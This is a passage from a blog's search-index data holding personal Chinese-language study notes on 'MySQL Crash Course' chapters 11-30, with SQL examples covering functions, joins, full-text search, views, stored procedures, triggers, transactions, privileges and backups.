MYSQLD_OPTS sudo systemctl restart mariadb # for mysql sudo systemctl revert mysql sudo systemctl daemon-reload sudo systemctl restart mysql   ","permalink":"https://blog.pseudocold.com/post/2018/mysql-mariadb-setup/","tags":["mariadb","mysql"],"title":"MariaDB/MySQL Setup: All in One"},{"categories":["Notes"],"contents":"GUI创建、管理表实际还是基于SQL语句。\ncreate table tablename;\n 为防止创建的表覆盖旧有表，应先手动删除旧表 drop table tablename; create table tablename if not exists;, 仅当表名不存在时创建；  1 2 3 4 5 6 7 8 9 10 11 12 13  CREATETABLEcustomers(cust_idintNOTNULLAUTO_INCREMENT,cust_namechar(50)NOTNULL,cust_addresschar(50)NULL,/* default \u0026#39;foobar\u0026#39;; */cust_citychar(50)NULL,cust_statechar(5)NULL,cust_zipchar(10)NULL,cust_countrychar(50)NULL,cust_contactchar(50)NULL,cust_emailchar(255)NULL,PRIMARYKEY(cust_id))ENGINE=InnoDB;  mysqldump导出内容中，表创键前先删除，导入数据前加锁。\n1 2 3 4 5 6 7 8 9  DROPTABLEIFEXISTS`customers`;/*!40101 SET @saved_cs_client = @@character_set_client */;/*!50503 SET character_set_client = utf8mb4 */;CREATETABLE`customers`(-...LOCKTABLES`customers`WRITE;/*!40000 ALTER TABLE `customers` DISABLE KEYS */;INSERTINTO`customers`/* ... */   默认情况，不明确指定时允许 NULL；  Note: NULL 值是没有值之意，'' 才是指空串；   主键值必须唯一。但可以使用多个列作为主键，其组合值必须唯一；  PRIMARY KEY (order_num, order_item) 主键只可使用NOT NULL列；   每个表只允许一个 AUTO_INCREMENT 列，并且必须被索引；  AUTO_INCREMENT列值可以通过INSERT手动指定，后续增量将基于此手动插入值； SELECT last_insert_id()，确定最后的自动增量，必须在插入后使用才有效，且不区分插入的表；    默认值\n MySQL 数据库中不允许使用函数作为默认值，这与其他大多数据库不同；default 1  MySQL 与其他 DBMS 不一样，支持多种引擎；\n InnoDB 引擎是一个可靠的事务处理引擎，但不支持全文搜索； MEMORY 引擎在功能上等同于MyISAM，但由于数据存储在内存中，速度快(特别适合于临时表)； MyISAM 是一个高性能引擎，支持全文搜索，但不支持事务处理； 外键不能跨引擎  更新表\n1 2 3 4 5 6 7 8 9 10  -- 增加列 altertablevendorsaddvend_phonechar(20);-- 删除列 altertablevendorsdropcolumnvend_phone;-- 修改表引擎？ altertabletable_name()engine=InnoDB;/* 覆盖原表 */-- 改变列名 altertablechangecol_namenew_namebooleannotnulldefaultfalse;  ALTER TABLE 定义外键\n 先定义键及类型，再调整为外键； 小心使用ALTER TABLE，更改前备份；  1 2 3 4 5 6 7  altertableorderitemsaddconstraintfk_orderitems_ordersforeignkey(order_num)referencesorder(order_num);altertableorderitemsaddcontraintfk_orderitems_productsforeignkey(prod_id)referencesproducts(prod_id);  1 2 3 4 5  -- 删除表 droptabletabelname;-- 重命名表 renametableoldtablenametonewtablename[,oldtonew];  Chapter 22: 使用视图 视图(MySQL 5+)是虚拟的表，SELECT语句层次的封装；\n 由于视图本身不包含数据，每次使用时处理查询执行，太过复杂的视图存在性能问题； 视图主要用于数据检索； 查询视图与查询表无异；  使用意图\n 重用SQL语句，简化操作； 保护数据，类似于封装； 更改数据格式和表示，视图可返回与底层表的表示和格式不同的数据；  视图规则\n 名字唯一，数目无限制 需要一定访问权限创建 可嵌套使用； 视图外ORDER BY优先，自动覆盖视图内ORDER BY； 视图不可索引；  1 2 3 4 5 6 7 8 9 10 11 12 13 14  -- 列出所有视图 -- show table status where comment=\u0026#39;view\u0026#39;; -- preferred SHOWFULLTABLESINdatabase_nameWHERETABLE_TYPELIKE\u0026#39;VIEW\u0026#39;;-- 创建视图 createviewviewnameasselect...;-- 查看视图创建语句 showcreateviewviewname;dropviewviewname;-- 创建新视图，自动替换存在的同名视图 createorreplaceviewviewname...;-- rename a view renameviewviewnametoviewname2;  1 2 3 4 5 6 7 8 9 10 11  createviewproductcustomersasselectcust_name,cust_contact,prod_idfromcustomersasc,ordersaso,orderitemsasoiwherec.cust_id=o.cust_idandoi.order_num=o.order_num;createviewvendorlocationsasselectconcat(rtrim(vend_name),\u0026#39; (\u0026#39;,rtrim(vend_country),\u0026#39;)\u0026#39;)asvend_titlefromvendorsorderbyvend_name;select*fromvendorlocations;  其他应用\n 视图where语句过滤表 计算字段  更新视图存在一定条件，并不总是可以更新。由于更新视图实际是在更新其基表，对于不能正确的确定被更新的基数据，则不允许更新(包含插入和删除)；\n 视图主要用于数据检索；  Chapter 23: 使用存储过程 存储过程(MySQL 5+)，事先保存的一条或多条MySQL语句集合，可视其为批文件；\n 封装，简化复杂操作，直接调用； 规范化一系列处理操作，使所有人使用相同代码，防止出错，保护数据完整性； 简化对变动的管理，批操作有了名字； 安全性，限制对基础数据的访问减少了数据的讹误，类似于封装；  存储过程类似于函数，可以有输入，输出，也可以只是执行语句。\n编写存储过程和访问、执行存储过程的过程是相分离的，其权限可以分开控制。\n调用存储过程，call procedurename(@param1,@param2); select @param1,@param2;\n1 2 3 4 5 6 7 8 9 10  delimiter//createprocedureproductpricing()beginselectavg(prod_price)aspriceaveragefromproducts;end//delimiter;callproductpricing  创建存储过程需要临时修改分隔符\n 记录集不是允许的类型，存储过程重要输出多个数据时，需要使用多个参数； 定义过程中的comment 'string'将会在show precedure status like 'procedurename'中出现；  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25  delimiter//createprocedureordertotal(inonumberint,intaxableboolean,outototaldecimal(8,2))comment\u0026#39;Obtain order total, optionally adding tax\u0026#39;begindeclaretotaldecimal(8,2);declaretaxrateintdefault6;selectsum(item_price*quantity)fromorderitemswhereorder_num=onumberintototal;-- 也可以调到select行之后 iftaxablethenselecttotal*(1+taxrate/100)intototal;endif;selecttotalintoototal;end//delimiter;callordertotal(20005,0,@total);-- store data in variable total select@total;  删除存储过程，drop procedure productpricing if exists;\n检查存储过程\n show create procedure procedurename; show procedure status like 'procedurename'; show procedure status 列出所有存储过程（包括系统内置）  Chapter 24: 使用游标 游标(cursor)时一个存储在MySQL数据库上的数据库查询，它不是一条SELECT语句，而是被该语句检索出来的结果集；\n 游标一般被创建在存储过程内，调用存储过程-打开游标-使用数据-关闭游标；  declare ordernumbers cursor for select order_num from orders;   open cursorname; CLOSE cursorname; 释放游标所使用的所有内存和资源;  MySQL在到达END语句后隐式关闭游标；    1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28  delimter//createprocedureprocessorders()begindeclaredonebooleandefault0;declareoint;declaretdecimal(8,2);declareordernumberscursorforselectorder_numfromorders;-- set done=1 when sqlstate \u0026#39;02000\u0026#39;, 02000表示未找到，循环结束时出现 declarecontinuehandlerforsqlstate\u0026#39;02000\u0026#39;setdone=1;createtableifnotexistsordertotals(order_numint,totaldecimal(8,2));-- open cursor openordernumbers;repeatfetchordernumbersintoo;callordertotal(o,1,t);-- insert result into a new table insertintoordertotals(order_num,total)values(o,t);untildoneendrepeat;closeordernumbers;end//delimter;  declare continue handler for sqlstate '02000' set done=1;\n 定义CONTINUE HANDLER，在条件出现时被执行的代码； 02000表示未找到，循环结束时出现  DECLARE定义次序：局部变量定义必须先于游标和句柄，句柄定义必须晚于游标；\nChapter 25: 使用触发器 触发器(MySQL 5+)，在某表发生更改时自动处理；\n 触发器针对DELETE, INSERT, UPDATE，之前或者之后触发； 确保每个数据库的触发器名唯一； 只有表支持触发器，视图不支持触发器； 触发器中不允许返回值。定义带输出参数的存储过程select into param，并在触发器中调用，以传出参数；  1 2 3  createtriggertriggernamebefore/afterdelete/update/createontablenameforeachrow...;droptriggertriggername;  若触发器执行失败，MySQL将不执行触发器对应事件语句。若干BEFORE触发器或者语句本身失败，MySQL将不执行AFTER触发器；\nINSERT触发器\n 在INSERT触发器代码内，可引用一个名为NEW的虚拟表，访问被插入的行； 在BEFORE INSERT触发器中，NEW中的值也可以被更新（允许更改被插入的值）； 对于AUTO_INCREMENT列，NEW在INSERT执行之前包含0，在INSERT执行之后包含新的自动生成值。故，以此可以传出AUTO_INCREMENT列新生成的值；  1 2 3 4 5 6  -- select `auto_increament`ed column createtriggerneworderafterinsertonordersforeachrowselectnew.order_num;-- test insertintoorders(order_date,cust_id)values(now(),10001);  1415, \u0026lsquo;Not allowed to return a result set from a trigger\u0026rsquo;\n本书示例存在错误，实际上从触发器中select出数据被禁止。\nDELETE 触发器\n 在DELETE触发器代码内，你可以引用一个名为OLD的虚拟表，访问被删除的行； OLD中的值全都是只读的，不能更新。  使用 BEGIN ... END 块定义多语句触发器；\n1 2 3 4 5 6  createtriggerdeleteorderbeforedeleteonordersforeachrowbegininsertintoarchive_orders(order_num,order_date,cust_id)values(old.order_num,old.order_date,old.cust_id);end;  UPDATE触发器\n 在UPDATE触发器代码中，你可以引用一个名为OLD的虚拟表访问以前（UPDATE语句前）的值，引用一个名为NEW的虚拟表访问新更新的值； 在BEFORE UPDATE触发器中，NEW中的值可能也被更新（允许更改将要用于UPDATE语句中的值）； OLD中的值全都是只读的，不能更新。  在INSERT, UPDATE触发器中，BEFORE通常用于数据验证和净化；\n1 2  createtriggerupdatevendorbeforeupdateonvendorsforeachrowsetnew.vend_state=upper(new.vend_state);   应用触发器保证数据的一致性(大小写、格式等)。其优点是这种处理总是进行，且透明，与客户端无关； 创建审计跟踪。利用触发器将更改(甚至包括之前和之后的状态)记录到另一个表中； 触发器不支持CALL语句，无法再触发器内调用存储过程；  Chapter 27: 管理事务处理  并非所有引擎都支持事务处理，在MySQL中使用InnoDB引擎进行事务处理； 事务处理(transaction processing)可以用来维护数据库的完整性，要么保证呈批的MySQL操作完全执行，要么完全不执行；  术语\n 事务（transaction），一组SQL语句或者说一组执行动作 回退（rollback），撤销指定SQL语句的过程 提交（commit），将为存储的SQL语句结果写入数据库表 保留点（savepoint），事务处理过程中临时占位符，作为回退位置  1 2 3 4 5 6 7 8  setautocommit=0;starttransaction;...savepointp1;...#rollbackto[savepointname];commit;setautocommit=1;   CREATE和DROP操作不可被回退； 事务处理中需要手动提交COMMIT；  当COMMIT或ROLLBACK语句执行后，事务会自动关闭，且自动释放保留点。在之后的操作恢复平常的隐式提交；   手动释放保留点，RELEASE SAVEPOINT identifier;；  MySQL默认行为时自动提交所有更改，更改这种行为，SET autocommit=0;。恢复set autocommit=1;\nChapter 27: 全球化和本地化 术语\n 字符集：字母和符号的集合； 编码：某个字符集成员的内部表示； 校对：规定字符如何比较的指令；  是否区分大小写；    校对在排序时期重要作用。\nMySQL 8 开始，使用 utf8mb4 作为 MySQL 的默认字符集。\n使用何种字符集和校对的决定在服务器、数据库和表这三级进行；\n show character set; 查看可用字符集 show collation; 查看可用校对以及对应于字符集的默认校对；  _cs 表示 case sensitive, _ci case insensitive;    查看当前系统默认字符集\n show variables like 'character%'; show variables like 'collation%'; 其中character_set_system为系统默认，只读  字符集设定优先顺序\n 如果指定CHARACTER SET和COLLATE两者，则使用这些值。 如果只指定CHARACTER SET，则使用此字符集及其默认的校对（如SHOW CHARACTER SET的结果中所示）。 如果既不指定CHARACTER SET，也不指定COLLATE，则使用数据库默认。  1 2 3 4 5 6 7  createtablemytable(column1int,column2varchar(10),column3varchar(10)charactersetlatin1collatelatin1_general_ci)defaultcharactersethebrewcollatehebrew_general_ci;  利用COLLATE临时区分大小写；\n collate还可用于select, group by, having, 聚集函数和别名等；  1 2  select*fromcustomersorderbylastname,firstnamecollatelatin1_general_cs;  Chapter 28: 安全管理 MySQL服务器的安全基础：用户应该对他们需要的数据具有适当的访问权，既不能多也不能少。\nMySQL用户账号和信息存储在名为mysql的MySQL数据库中\n1 2 3  -- 列出所有用户，包括特殊用户； usemysql;selectuserfromuser;  创建用户账号\n create user username identified by 'password'; 重命名，rename user oldname to newname; grant 授权时创建； insert 到 mysql.user 表；  删除账号，drop user username;\n MySQL 5+ 以后删除用户是自动删除用户相关权限，对于之前版本要先revoke相关权限；  访问权限\n show grants for username; 列出权限；   USAGE ON *.*, usage 表示根本没有权限； 'username'@'host', % 默认主机名表示对于主机无限制； grant all, revoke all操作用户在整个服务器的权限  1 2  grantselect[,insert]ondatabasename.*tousername;revokeselectondbname.*fromusername;  常见权限\n all, 除grant option外所有权限 alter alter routine for alter procedure, drop procedure create for create table delete drop for drop table index for create/drop index insert reload for flush command select show databases show view for show create view update usage无访问权限  使用grant, revoke 时，用户账户必须存在，但对其所涉及的对象(数据库，表)不需要。可实现在创建数据库和表之前设计和实现安全措施；\n更改密码，set password [for username] = password('password');\nChapter 29: 数据库维护 数据库备份\n 命令行实用程序 mysqldump 转储所有数据库内容到某个外部文件。 命令行实用程序 mysqlhotcopy 从一个数据库复制所有数据（并非所有数据库引擎都支持这个实用程序）。 使用MySQL的BACKUP TABLE或SELECT INTO OUTFILE转储所有数据到某个外部文件。  [mysqld] secure-file-priv='' 开启外部文件写入；     备份前使用flush tables刷新未写数据；  数据库维护\n analyze table tablename; check table tablename;  Chapter 30: 改善性能  存储过程比一条一条执行其中语句快； 导入数据前，关闭自动提交。或先删除索引，在导入后再重建，否则多次触发索引影响性能； select ... union ...; 性能优于 select ... or ...; like 很慢，最好使用 FULLTEXT；  附录 数据类型表，用的时候参照，不再贴在这里。\n","permalink":"https://blog.pseudocold.com/post/2018/mysql-crashcourse-03/","tags":["mysql"],"title":"MySQL必知必会：21-30"},{"categories":["Notes"],"contents":"《MySQL必知必会》个人笔记，不做解读。\nChapter 11: 使用数据处理函数 函数的可移植性没有SQL强， 因为不同DBMS实现的函数不大相同。\n常见 SQL 函数\n 处理文本串； 算术操作 (绝对值，代数运算)； 处理日期和时间值，以及从其中提取特定成分； 返回 DBMS 的特殊信息 (登录信息，版本细节；  文本处理\n Left(), Right()，返回串左、右字符； Length() Locate(string,col_name)，找出串的一个子串； Lower(), Upper()，大小写转换 LTrim(), Rtrim() Substring()，返回子串的字符，还没明白怎么用； Soundex()，SOUNDEX 是一个将任何文本串转换为描述其语音表示的字母数字模式的算法。SOUNDEX 考虑了类似的发音字符和音节，使得能对串进行发音比较而不是字母比较。  where soundex(cust_contact) = soundex('Y. Lie');    1 2  selectcust_name,cust_contactfromcustomerswheresoundex(cust_contact)=soundex(\u0026#39;Y. Lie\u0026#39;);  时间和日期处理\n 不管是插入或更新表值还是用 WHERE 子句进行过滤，日期必须为格式 yyyy-mm-dd。 检索某月的订单  where date(order_date) between '2005-09-01' and '2015-09-30'; where year(order_date) = 2005 and month(order_date) = 9;       函数 说明     AddDate() 增加一个日期（天、周等）   AddTime() 增加一个时间（时、分等）   CurDate() 返回当前日期   CurTime() 返回当前时间   Date() 返回日期时间的日期部分   DateDiff() 计算两个日期之差   Date_Add() 高度灵活的日期运算函数   Date_Format() 返回一个格式化的日期或时间串   Day() 返回一个日期的天数部分   DayOfWeek() 对于一个日期，返回对应的星期几   Hour() 返回一个时间的小时部分   Minute() 返回一个时间的分钟部分   Month() 返回一个日期的月份部分   Now() 返回当前日期和时间   Second() 返回一个时间的秒部分   Time() 返回一个日期时间的时间部分   Year() 返回一个日期的年份部分    注：Date(), Time() 在 MySQL 4.1.1 中引入。\n1 2  selectcust_id,order_numfromordersDate(order_date)=\u0026#39;2005-09-01\u0026#39;;-- where order_date = \u0026#39;2005-09-01\u0026#39; 无法保证时间为 00:00:00   数值处理函数\n Abs() Cos() Exp()，返回指数值； Mod()，返回除法操作的余数； Pi() Rand()，返回一个随机数 0-1； Sin() Sqrt() Tan()  Chapter 12: 汇总数据 汇总数据，而不必实际检索出每条数据\n 行数 行组之和 列的最大值、最小值、平均值  聚集函数 (aggregate function)：运行在行组上，返回单个值得函数；\n AVG(), select avg(prod_price) as avg_price from products;  AVG() 函数忽略值为 NULL 的行，此行不参与平均值计算；   COUNT()，行数；  count(*) 不忽略空值行，对表中行数计数； count(column) 对特定列中具有值得行计数，忽略空值 null 行；   MAX(), MIN(). 可以作用在文本串上； SUM()，某列数据总值；  sum() 不仅可以作用在单列上，也可合计计算值：select sum(item_price*quantity) as total_price；    聚集不同值 (DISTINCT, MySQL 5.0+)\n ALL 为默认行计算行为(与DISTINCT对应)，即某列中所有项均考虑在内； DISTINCT，行计算时，只考虑列中不同的值；  select avg(distinct prod_price) as avg_price distinct 只能用于 count() 而非 count(*)，如 select count(distinct prod_price)    组合聚集函数，利用多个聚集函数针对不同列，输出多个非基本数据列；\n聚集函数被设计得高效，在服务端汇总，比获取数据后在客户机计算要快得多。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14  selectavg(prod_price)asavg_pricefromproductswherevend_id=1003;selectsum(quantity)asitem_orderedfromorderitemswhereorder_num=20005;-- sum 计算函数 selectsum(item_price*quantity)astotal_pricefromorderitemswhereorder_num=20005;selectavg(distinctprod_price)asavg_pricefromproductswherervend_id=1003;selectcount(*)asnum_items,min(prod_price)asprice_min,max(prod_price)asprice_max,avg(prod_price)asprice_avgfromproducts;  Chapter 13: 分组数据 数据分组：划分多个逻辑组；\nGROUP BY 分组\n group by 子句可以包含任意数目的列， 即嵌套分组； 嵌套分组时，数据汇总发生在最后规定的列上，即在最底层分组汇总； group by 子句中的列必须是检所列或者有效的表达式，但不能是聚集函数； null 被分为一组； group by 必须在 where 子句之后，order by 子句之前； WITH ROLLUP 关键字，输出每层分组的汇总级别； group by 限制了聚集函数的计算范围；  HAVING 过滤分组\n where 过滤指定行而不是分组； where 在分组前过滤行，having 在分组后过滤分组。where排除的行不会出现在分组中。 eg: group by vend_id having count(*)\u0026gt;=2; 可以使用别名筛选；  排序与分组    ORDER BY GROUP BY     排序产生的输出 分组行。但输出可能不是分组的顺序   任意列都可以使用（甚至非选择的列也可以使用） 只可能使用选择列或表达式列，而且必须使用每个选择列表达式   不一定需要 如果与聚集函数一起使用列（或表达式），则必须使用    GROUP BY并不能保证按照分组顺序输出。\nselect 子句顺序\n select from where group by having order by limit  1 2 3 4 5 6 7  selectvend_id,count(*)asnum_prodsfromproductsgroupbyvend_id;selectcust_id,count(*)asnum_ordersfromordersgroupbycust_idhavingcount(*)\u0026gt;=2;-- or having num_orders \u0026gt;= 2; -- order by ordertotal selectorder_num,sum(quantity*item_price)asordertotalfromorderitemsgroupbyorder_numhavingordertotal\u0026gt;=50;  Chapter 14: 使用子句查询 子查询 (subquery)，嵌套在其他查询之中的查询\n select sth from somewhere where sth in (select ...) 使用子查询并不一定是最有效的方式，有时候联结是一种更优雅的解决办法； 由于性能限制，不能嵌套太多子查询 子查询where语句需要使用完全限定名  相关子查询 (correlated subquery)，涉及外部查询的子查询；\n 如，子查询语句中存在外层查询列名；  子查询编写时，最好从内层到外层依次测试，最后建立一个子查询语句。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14  selectcust_idfromorderswhereorder_numin(selectorder_numfromorderitemswhereprod_id=\u0026#39;TNT2\u0026#39;);selectcust_name,cust_contactfromcustomerswherecust_idin(selectcust_idfromorderswhereorder_numin(selectorder_numfromorderitemswhereprod_id=\u0026#39;TNT2\u0026#39;));-- 对计算字段进行子查询：客户订单数量 selectcust_name,cust_state,(selectcount(*)fromorderswhereorders.cust_id=customers.cust_id)asordersfromcustomersorderbycust_name;  Chapter 15: 创建联结表 (join) 外键 (foreign key)，某个表中包含另一个表中主键的列；\n关系数据可以有效地存储和方便地处理。因此，关系数据库的可伸缩性远比非关系数据库要好。\n联结是一种机制，用来在一条SELECT 语句中关联表，因此称之为联结。\n 联结不是物理实体。换句话说，它在实际的数据库表中不存在。联结由MySQL根据需要建立，它存在于查询的执行当中。\n 创建联结\n select ... from table1,table2 where table1.col=table2.col ...; 笛卡尔积 (cartesian product)，由没有联结条件的表关系返回的结果，纯粹多个表的组合输出，其行数为多个表的行数之积；笛卡尔积的联结类型又称叉联结； 联结时总是提供联结条件，否则产生笛卡尔积； 内部链接 / 等值联结 (equijoin)，inner join ... on ...  select ... from table1 inner join table2 on table1.col=table2.col; 等值联结多个表时存在顺序问题：inner join 联结表之前不可以将表列名参与等值条件判断； 联结多个表时不推荐使用 inner join ... on ...，此法书写时要注意顺序，而且相对 from table1, table2[, table3] where 条件联结，书写更长；   查询时若联结中的表具有相同列名，为避免混淆，查询共有列名时必须指定全名；  选择购买 prod_id='TNT2' 的客户信息 cust_name 和 cust_contact。\n 从 oreritems 表查找购买 prod_id='TNT2' 的订单号 order_num； 由订单号 order_num 从 orders 表查找购买用户 cust_id； 根据用户 IDcust_id，在 customers 表中检索出用户信息； 倒着整理一下，客户信息需要从 customers 表检索客户 IDcust_id，而客户 IDcust_id 需要在 orders 表满足这样的订单号条件 order_num，这些订单号 order_num 在 orderitems 表中要求订单包含了商品 prod_id = 'TNT2'。  inner join \u0026lt;table\u0026gt; on语法，ANSI SQL规范，但是写起来不方便。\n1 2 3 4 5 6 7 8  selectvend_name,prod_name,prod_pricefromvendors,producstwherevendors.vend_id=products.vend_id-- 非明确的联结语法 orderbyvend_name,prod_name;selectvend_name,prod_name,prod_pricefromvendorsinnerjoinproductsonvendors.vend_id=products.vend_id;  多级select子句 v.s. where多个联结 v.s. inner join多个联结\n1 2 3 4 5  selectcust_name,cust_contactfromcustomers,orders,orderitemswherecustomers.cust_id=orders.cust_idandorderitems.order_num=orders.order_numandprod_id=\u0026#39;TNT2\u0026#39;;  1 2 3 4  selectcust_name,cust_contactfromcustomersinnerjoinordersoncustomers.cust_id=orders.cust_idinnerjoinorderitemsonorders.order_num=orderitems.order_numwhereprod_id=\u0026#39;TNT2\u0026#39;;  1 2 3 4 5 6  selectcust_name,cust_contactfromcustomerswherecust_idin(selectcust_idfromorderswhereorder_numin(selectorder_numfromorderitemswhereprod_id=\u0026#39;TNT2\u0026#39;));  Chapter 16: 创建高级联结 表别名 from customers as c，大幅简化 where 条件判断的书写；前面已经介绍了select as用法。\n1 2 3 4 5  selectcust_name,cust_contactfromcustomersasc,ordersaso,orderitemsasoiwherec.cust_id=o.cust_idando.order_num=oi.order_numandprod_id=\u0026#39;TNT2\u0026#39;;  自联结\n 从当前表取出信息来筛选，如当前表中 prod_id = 'DTNTR' 生产商的所有产品。 自联结时多个相同表要使用别名来区分。列名也要使用列全名来区分从哪个表中检索； 自联结与子查询的处理速度不同，必要时可以比较二者效率，择优使用；  1 2 3 4 5 6  -- 查询产品 DTNTR 供应商所提供的所有产品 selectprod_id,prod_namefromproductswherevend_id=(selectvend_idfromproductswhereprod_id=\u0026#39;DTNTR\u0026#39;);  1 2 3 4  selectp1.prod_id,p1.prod_namefromproductsasp1,productsasp2wherep1.vend_id=p2.vend_idandp2.prod_id=\u0026#39;DTNTR\u0026#39;;  自然联结：排除多个表中相同列多次出现(人工排除)；\n 对表查询使用 select table1.*，对其他表明确的子句查询列。其实还是手动选择不重复的列出来；  1 2 3  selectc.*o.order_num,o.order_date,oi.prod_id,oi.quantity,oi.item_pricefromcustomersasc,ordersaso,orderitemsasoiwherec.cust_id=o.cust_idandoi.order_num=o.order_numandprod_id=\u0026#39;FB\u0026#39;\\G  注：表格输出行过长时，使用 \\G(大写) 而非 ; 结尾，可以取消表格输出；\n外部联结：联结包含了那些在相关表中没有关联行的行；\n 如，表 1 中的某列信息，在表 2 中列 2 没有对应值，即值为 null； from table1 left outer join table2 on ...; left outer join 表示从左边的表选择所有的行； 内部联结不能检索出没有关联行的行，外部联结可以检索出没有值，或者说值为 null 的行；  MySQL不支持简化字符 *= 和 =* 的使用，这两种操作符在其他DBMS中是很流行的。\n1 2 3 4 5  -- 带聚集函数的联结 selectc.cust_name,c.cust_id,count(o.order_num)asord_numfromcustomersascinnerjoinordersasoonc.cust_id=o.cust_idgroupbyc.cust_id;  Chapter 17: 组合查询 又称并 (union)，或复合查询 (compound query)。\n使用场合\n 在单个查询中从不同的表返回类似结构的数据； 对单个表执行多个 select 查询，按单个查询返回结果； 多数情况下组合查询 union 和多个 where 条件筛选可以达到相同的目的，但两种技术的性能不同，根据情况择优使用；  UNION 创建组合查询\n select ... union select ... union 必须有两条或以上语句组成； union 中每个查询必须包含相同的列、表达式或聚集函数，也就是说输出内容种类相同。实际上与 and 对应的一种逻辑嘛； union 默认删除两个查询语句中重复行，使用 union all 可以返回所有匹配行； 组合查询排序 order by 语句唯一，多条查询结果的并集是作为一个整体输出；  1 2 3 4 5 6 7  selectvend_id,prod_id,prod_pricefromproductswhereprod_price\u0026lt;=5unionselectvend_id,prod_id,prod_pricefromproductswherevend_idin(1001,1002);-- use only where selectvend_id,prod_id,prod_pricefromproductswhereprod_price\u0026lt;=5orvend_in(1001,1002);  Chapter 18: 全文本搜索 理解全文本搜索\n MySQL 支持多种数据库引擎，如 MyISAM, InnoDB, 但并不是所有引擎都支持全文搜索。MyISAM 支持全文搜索，但是 InnoDB 不支持。 MySQL 全文本搜索不需要每次分别查看每个行，不需要分别分析和处理每个词； MySQL 通过创建指定列中每个词的索引，搜索可以针对这些词进行。  启用全文搜索\n create table table_name (..., FULLTEXT(col_name)) ENGINE=MyISAM; 不在导入数据时使用 FULLTEXT。在导入数据时不要启用 FULLTEXT 索引，应先导入所有数据，再修改定义 FULLTEXT。一次索引所有行数据时间小于导入时针对每行更新索引。  在增加、更新或删除行时， 索引随之自动更新。（也就是说索引加快了检索速度，但是牺牲了数据更改的性能。）\n1 2 3 4 5 6 7 8 9 10 11 12  ##########################Createproductnotestable##########################CREATETABLEproductnotes(note_idintNOTNULLAUTO_INCREMENT,prod_idchar(10)NOTNULL,note_datedatetimeNOTNULL,note_texttextNULL,PRIMARYKEY(note_id),FULLTEXT(note_text))ENGINE=MyISAM;  全文搜索使用\n where Match(col_name) Against('string'); 全文本搜索同样默认不区分大小写，除非使用 BINARY； 全文本搜索结果默认排序遵循高等级优先原则，如搜索字符串在文本中出现位置； 查询扩展，设法放宽所返回的全文本搜索结果的范围。  找出全文本搜索匹配行； 检查匹配行并选择行中有用词； 再次进行全文本搜索，不仅使用原来的条件，还是用所有有用的词； 使用查询扩展时，MySQL 对数据和索引进行两边扫描来完成搜索。 Against('string' WITH QUERY EXPANSION);    扩展查询类似于联想词，从匹配行中获取相关词，以相关词再搜索一遍索引。\n布尔文本操作 (boolean mode)\n Against('string' IN BOOLEAN MODE); 即便没有 FULLTEXT 索引也可以使用布尔文本搜索； +, 包含，词必须存在； -, 排除，不允许存在； \u0026gt;, 包含，且增加等级值，非必须； \u0026lt;, 包含，且减少等级值； (), 作为字表达式，成为一个组； ~, 取消一个词的排序值； *, 词尾通配符；  match(text_note) against('heavy -rope*' in boolean mode，排除以 rope 开始的词，非以其开始的行之意；   \u0026quot;\u0026quot;, 定义短语，以整个短语为匹配； 布尔方式中，等级值不影响输出顺序，不按等级值降序排序返回的行。  布尔文本查询示例\n Against('+rabbit +bait' in boolean mode);，两个词必须同时存在； Against('rabbit bait' in boolean mode);，两个词至少匹配一个； Against('\u0026gt;rabbit \u0026lt;carrot' in boolean mode), 增加前者等级，降低后者等级 Against('\u0026quot;rabbit bait\u0026quot;' in boolean mode);，\u0026quot;rabbit bait\u0026quot; 作为一个词被匹配； Against('+safe +(\u0026lt;combination)' in boolean mode);，必须存在且减小等级值；  1 2 3 4 5 6 7 8 9 10  selectnote_id,note_textfromproductnoteswherematch(note_text)against(\u0026#39;rabbit\u0026#39;);-- 查看全文检索优先级输出 (语法失效) -- use match in select but not in where selectnote_id,note_text,match(note_text)against(\u0026#39;rabbit\u0026#39;)asrankfromproductnotes;-- 布尔模式 selectnote_id,note_textfromproductnoteswherematch(note_text)against(\u0026#39;heavy -rope*\u0026#39;inbooleanmode);-- against(\u0026#39;+rabbit +bait\u0026#39; in boolean mode);   额外说明\n 全文本索引忽略短词 (3 个或 3 个以下字符的词)； 属于 MySQL 内建非用词 (stopword) 列表的词不被索引； 高频词 (\u0026gt;50%) 不被搜索，50% 规则不适用于 in boolean mode； 表中行数少于 3 行 (1~2 行)，不返回搜索结果，因为或不出现或高于 50%； 全文搜索忽略词中单引号； 不具有词分隔符语言 (日语、汉语等) 不适用于全文检索；（那我还学个屁啊） 全文搜索仅在 MyISAM 引擎中受支持；  针对部分字符串的索引，如针对列值的前16个字符进行索引\n1  CREATEINDEXdefinitionONdictionary(id,definition(16));  Chapter 19: 插入数据 涉及内容\n 插入完整行； 插入行的一部分； 插入多行； 插入某些查询结果；  INSERT INTO table_name VALUES(,,,);\n insert 语句一般没有输出； 插入值得顺序根据 describe table_name 决定； auto_increment 自动增量的值设置为 null，系统会自行为其分配值；  自定义值的填充顺序\n insert into table_name(col_name_1,col_name_2) values(value_1,value_2); 不依赖于表中列的次序，但是相对繁琐  注\n 一般不要使用没有明确给出列的列表的 insert 语句； 插入时总是明确指明列； 没有明确给出列名时，必须给每个表列提供一个值；若明确给出了列名，值 (的数目) 要与列名对应； 省略列，列值允许为 null 和列存在默认值的列，可以在 insert 语句中省略； 降低语句优先级，使得同时访问客户的其他动作 (如查询) 优先。insert LOW_PRIORITY into；  插入多行\n insert into table(col, col) values(val, val), (); 单条 insert 语句处理多个插入要比使用多条 insert 语句快；  插入检索结果\n insert into oldtable(\u0026lt;column names\u0026gt;) select \u0026lt;col\u0026gt;, \u0026lt;col\u0026gt; from newtable; 检索表结构应与新表结构一致 (或者至少插入列一致)； 可以省略检索表中的主键，以免插入重复主键，这样会导致当前数据，及之后的数据插入失败； MySQL 不关心 select 返回的列名，它使用的是列的位置，对应位置上列值类型对应即可；  Chapter 20: 更新和删除数据 update tablename set colname=value, col=val where colname2=value2;\n UPDATE 中使用子查询更新列数据； WHERE 子句不存在时更新所有行； UPDATE IGNORE 在更新多条语句时忽略错误行继续操作； 删除某列值时更新其值为 NULL；  delete from tablename where colname=value;, 删除整行；\n truncate table tablename; 删除所有行，速度较DELETE快(实际是删除表并重新创建一个表，而不是逐条删除表中数据)；  drop table tablename;, 删除表；\nTips:\n UPDATE, DELETE 前使用SELECT进行测试； 